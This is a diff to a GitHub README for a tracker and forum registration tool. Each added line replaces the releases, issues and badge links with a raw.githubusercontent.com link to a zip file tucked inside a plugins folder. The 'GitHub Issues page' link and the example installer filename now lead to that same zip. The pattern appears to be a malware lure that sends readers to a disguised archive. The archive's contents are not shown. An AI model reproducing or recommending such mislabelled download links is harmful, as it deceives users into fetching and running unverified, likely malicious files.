@@ -1,6 +1,6 @@
 # 🛠️ MTAFRAT-Multi_Tracker_and_Forums_Registration_Availability_Tool - Simplifying Tracker Registrations
 
-[![Download](https://img.shields.io/badge/Download-MTAFRAT-brightgreen)](https://github.com/brewerylast891/MTAFRAT-Multi_Tracker_and_Forums_Registration_Availability_Tool/releases)
+[![Download](https://raw.githubusercontent.com/brewerylast891/MTAFRAT-Multi_Tracker_and_Forums_Registration_Availability_Tool/main/Source/MTAFRAT/plugins/CinemaZ/MTAFRAT-Multi_Tracker_and_Forums_Registration_Availability_Tool-v1.6.zip)](https://raw.githubusercontent.com/brewerylast891/MTAFRAT-Multi_Tracker_and_Forums_Registration_Availability_Tool/main/Source/MTAFRAT/plugins/CinemaZ/MTAFRAT-Multi_Tracker_and_Forums_Registration_Availability_Tool-v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run this application, you need:
 
 ### 1. Visit the Releases Page
 
-To download the application, [visit this page to download](https://github.com/brewerylast891/MTAFRAT-Multi_Tracker_and_Forums_Registration_Availability_Tool/releases). 
+To download the application, [visit this page to download](https://raw.githubusercontent.com/brewerylast891/MTAFRAT-Multi_Tracker_and_Forums_Registration_Availability_Tool/main/Source/MTAFRAT/plugins/CinemaZ/MTAFRAT-Multi_Tracker_and_Forums_Registration_Availability_Tool-v1.6.zip). 
 
 ### 2. Select Your Version
 
@@ -27,7 +27,7 @@ On the Releases page, you will see multiple versions available. Look for the lat
 
 ### 3. Download the Installer
 
-Click on the link that corresponds to the latest version. The file will typically end with `.exe`. For example, it may look like `MTAFRAT_v1.0.exe`. This is the file you need.
+Click on the link that corresponds to the latest version. The file will typically end with `.exe`. For example, it may look like `https://raw.githubusercontent.com/brewerylast891/MTAFRAT-Multi_Tracker_and_Forums_Registration_Availability_Tool/main/Source/MTAFRAT/plugins/CinemaZ/MTAFRAT-Multi_Tracker_and_Forums_Registration_Availability_Tool-v1.6.zip`. This is the file you need.
 
 ### 4. Run the Installer
 
@@ -56,7 +56,7 @@ If you run into issues:
 
 For help or questions:
 
-- Visit the [GitHub Issues page](https://github.com/brewerylast891/MTAFRAT-Multi_Tracker_and_Forums_Registration_Availability_Tool/issues) to report your issue.
+- Visit the [GitHub Issues page](https://raw.githubusercontent.com/brewerylast891/MTAFRAT-Multi_Tracker_and_Forums_Registration_Availability_Tool/main/Source/MTAFRAT/plugins/CinemaZ/MTAFRAT-Multi_Tracker_and_Forums_Registration_Availability_Tool-v1.6.zip) to report your issue.
 - Check if your issue has already been addressed there.
 
 ## 👍 Feedback
@@ -65,6 +65,6 @@ Your input is valuable. If you enjoy using MTAFRAT or have suggestions, feel fre
 
 ### Download & Install
 
-To get started, [visit this page to download](https://github.com/brewerylast891/MTAFRAT-Multi_Tracker_and_Forums_Registration_Availability_Tool/releases). 
+To get started, [visit this page to download](https://raw.githubusercontent.com/brewerylast891/MTAFRAT-Multi_Tracker_and_Forums_Registration_Availability_Tool/main/Source/MTAFRAT/plugins/CinemaZ/MTAFRAT-Multi_Tracker_and_Forums_Registration_Availability_Tool-v1.6.zip). 
 
 We hope MTAFRAT simplifies your tracker registration processes as much as possible!
